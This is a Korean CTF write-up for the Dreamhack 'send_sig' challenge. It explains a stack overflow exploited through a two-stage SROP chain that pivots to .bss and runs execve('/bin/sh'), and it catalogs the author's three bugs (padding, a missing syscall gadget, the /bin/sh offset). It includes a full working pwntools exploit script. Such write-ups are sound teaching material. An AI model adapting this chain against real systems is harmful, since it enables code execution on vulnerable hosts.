# send_sig (SROP) — 오답노트

Dreamhack `send_sig`. 작은 BOF로 **SROP 2단계**를 엮어 셸을 따는 문제.
개념은 맞게 잡았는데 **디테일 3개**가 어긋나서 SIGSEGV가 났다. 그 세 개를 오답노트로 정리한다.

바이너리: x86-64, No PIE(0x400000), NX, No canary. 정적 가젯만으로 SROP 가능.

---

## 0. 한눈에

| 항목 | 값 |
|---|---|
| 취약점 | `read(0, rbp-8, 0x400)` → 버퍼 8바이트인데 0x400 읽음 → **BOF** |
| 패딩 | 버퍼 시작 ~ 리턴주소 = **16바이트** (버퍼 8 + 저장 RBP 8) |
| 가젯 | `pop rax; ret`(0x4010ae), `syscall; ret`(0x4010b0) |
| 전략 | ① SROP로 `read(0, bss, 0x400)` + `rsp=bss` 피벗 → ② bss에 execve 프레임 전송 |
| 승리 | `execve("/bin/sh", 0, 0)` |

취약 함수:
```asm
4010ba: push rbp
4010bb: mov  rbp, rsp
4010be: sub  rsp, 0x10
4010dd: lea  rax, [rbp-0x8]     ; 버퍼 = rbp-8  (고작 8바이트)
4010f3: call read               ; read(0, rbp-8, 0x400)  ← overflow
4010f9: leave
4010fa: ret
```

스택 레이아웃:
```
오프셋 0 ~7  : 버퍼 (rbp-8)
오프셋 8 ~15 : 저장된 RBP
오프셋 16~23 : 리턴주소   ← 가젯으로 덮어야 하는 자리
```

---

## 왜 SROP + 피벗이 필요한가

버퍼가 `rbp-8`이라 리턴주소까지 **겨우 16바이트**. 그런데 SigreturnFrame은 **248바이트(0xf8)**라 스택에 한 번에 다 못 넣는다(0x400까지 읽으니 사실 스택엔 들어가지만, 정석 패턴 연습으로 bss 피벗을 쓴다).

핵심 분리:
> 프레임을 오버플로우 자리에 넣으려 하지 말고 → **bss에 따로 깔고 → `frame.rsp = bss`로 피벗** → sigreturn.

1단계 SROP가 `read(0, bss, 0x400)`를 돌리면서 **rsp까지 bss로 세팅**해두면, read가 끝나고 `ret`할 때 자연스럽게 bss의 2단계 체인으로 넘어간다.

---

## 오답 1 — 패딩을 8바이트 더 넣었다 (SIGSEGV 직접 원인)

### ❌ 내가 쓴 것
```python
payload  = b'A'*16
payload += b'B'*8          # ← 이게 리턴주소 자리를 BBBBBBBB로 덮음
payload += p64(pop_rax_ret)
```

### 왜 틀렸나
버퍼(8) + 저장 RBP(8) = **16바이트**면 이미 리턴주소 자리에 도달한다.
`A*16` 다음에 오는 8바이트가 **곧 리턴주소**인데, 거기에 `B*8`을 넣어버려서
리턴주소 = `0x4242424242424242` → `ret` 하자마자 그 주소로 점프 → **SIGSEGV**.
`pop_rax_ret`은 오프셋 24로 밀려나 영영 실행 안 됨.

### ✅ 고친 것
```python
payload  = b'A'*16         # 패딩은 딱 16
payload += p64(pop_rax_ret)
```

### 교훈
> "버퍼 크기"가 아니라 **"버퍼 시작 ~ 리턴주소까지의 거리"**를 센다.
> `lea rax,[rbp-0x8]`을 보고 `(rbp-8 → rbp+8) = 16`을 바로 계산할 것. 헷갈리면 `cyclic`으로 확정.

---

## 오답 2 — `syscall` 가젯을 빼먹었다 (sigreturn이 안 터짐)

### ❌ 내가 쓴 것
```python
payload += p64(pop_rax_ret)
payload += p64(15)         # sigreturn 번호
payload += bytes(frame)    # ← 바로 프레임이 옴
```

### 왜 틀렸나
`pop rax; ret`로 rax=15를 세팅한 뒤, **ret이 `syscall` 명령으로 점프**해야 sigreturn이 실행된다.
그런데 `15` 바로 뒤에 `bytes(frame)`을 두면, ret이 **프레임의 첫 8바이트(uc_flags, 레지스터 아님)**로 점프해버린다 → 엉뚱한 주소 실행 → 깨짐.

### ✅ 고친 것 — SROP 트리거의 정석 모양
```python
payload += p64(pop_rax_ret)
payload += p64(15)
payload += p64(syscall)    # ★ 이게 있어야 sigreturn이 실제로 호출됨
payload += bytes(frame)
```

```
pop rax; ret  →  15  →  syscall; ret  →  [SigreturnFrame]
                                 ↑ 이 순간 RSP가 프레임 시작을 가리킨다
```
`syscall`로 점프하는 순간 RSP가 자동으로 `bytes(frame)` 시작을 가리키게 되어,
커널이 그걸 sigcontext로 읽어 레지스터를 전부 복원한다.

### 교훈
> SROP 트리거는 **`pop rax → 15 → syscall → frame`** 이 4개가 한 세트.
> 하나라도 빠지면 조용히 깨진다. 특히 `15`와 `frame` 사이 `syscall`을 빠뜨리기 쉽다.

---

## 오답 3 — `/bin/sh` 주소가 8바이트 어긋났다

### ❌ 내가 쓴 것
```python
frame2.rdi = bss + 0x108   # 손으로 때려 맞춘 상수
```

### 왜 틀렸나
오답 2를 고쳐 `syscall` 가젯을 넣으면 프레임이 8바이트 뒤로 밀린다.
그러면 프레임 뒤에 붙인 `"/bin/sh"`도 `bss+0x110`으로 이동하는데, `rdi`는 여전히 `bss+0x108`을 가리켜
→ 깨진 문자열로 execve → 실패.

### ✅ 고친 것 — 상수 대신 계산
```python
chain  = p64(pop_rax_ret) + p64(15) + p64(syscall)
binsh  = bss + len(chain) + len(bytes(SigreturnFrame()))  # 프레임 뒤 실제 위치
f2.rdi = binsh
chain += bytes(f2)
chain += b'/bin/sh\x00'
```

### 교훈
> 레이아웃에 의존하는 주소는 **손으로 상수를 적지 말고 `len()`으로 계산**한다.
> 체인 중간에 뭔가 추가/삭제하면 상수는 반드시 어긋난다.
> (주의: `rdi`는 `bytes(f2)` **호출 전에** 세팅해야 반영됨 — SigreturnFrame은 bytes() 뜨는 순간 값이 고정된다.)

---

## 1. 전체 흐름 (고친 뒤)

```
[1단계] BOF로 스택에 SROP 체인
  pop rax → 15 → syscall → frame1
  frame1: read(0, bss, 0x400), rip=syscall, rsp=bss
     ↓ sigreturn → read 실행 (2단계 입력 대기)
     ↓ read 끝 → ret → [bss]로 피벗

[2단계] bss에 깔린 SROP 체인
  pop rax → 15 → syscall → frame2
  frame2: execve(bss+..., 0, 0), rip=syscall
     ↓ sigreturn → execve("/bin/sh", 0, 0) → 셸
```

---

## 2. 최종 익스플로잇

```python
from pwn import *
context.arch = 'amd64'

e = ELF('./send_sig')
p = process('./send_sig')

pop_rax_ret = next(e.search(asm('pop rax; ret')))
syscall     = next(e.search(asm('syscall; ret')))
bss         = e.bss() + 0x100

# ---- 1단계: read(0, bss, 0x400) + rsp=bss 피벗 ----
f1 = SigreturnFrame()
f1.rax = 0; f1.rdi = 0; f1.rsi = bss; f1.rdx = 0x400
f1.rip = syscall
f1.rsp = bss

payload  = b'A'*16
payload += p64(pop_rax_ret) + p64(15) + p64(syscall)
payload += bytes(f1)
p.sendline(payload)

# ---- 2단계: execve("/bin/sh", 0, 0) ----
chain  = p64(pop_rax_ret) + p64(15) + p64(syscall)
binsh  = bss + len(chain) + len(bytes(SigreturnFrame()))

f2 = SigreturnFrame()
f2.rax = 0x3b; f2.rdi = binsh; f2.rsi = 0; f2.rdx = 0
f2.rip = syscall

chain += bytes(f2) + b'/bin/sh\x00'
p.sendline(chain)

p.interactive()
```

---

## 3. 체크리스트 (다음에 SROP 풀 때)

- [ ] 패딩 = **버퍼 시작 ~ 리턴주소 거리** (버퍼 크기 아님). `lea [rbp-N]` 꼭 확인
- [ ] 트리거는 **`pop rax → 15 → syscall → frame`** 4종 세트. `syscall` 빠뜨리지 말 것
- [ ] 작은 BOF면 **`frame.rsp = <넓은곳>`으로 피벗** 후 그 자리에서 다음 체인
- [ ] 레이아웃 의존 주소(`/bin/sh` 등)는 **`len()`으로 계산**, 상수 금지
- [ ] `SigreturnFrame`은 `bytes()` 뜨기 전에 레지스터 세팅 완료
- [ ] 로컬에선 `pop rax; ret`, `syscall; ret` 가젯 주소를 `objdump`/`ROPgadget`으로 교차 검증
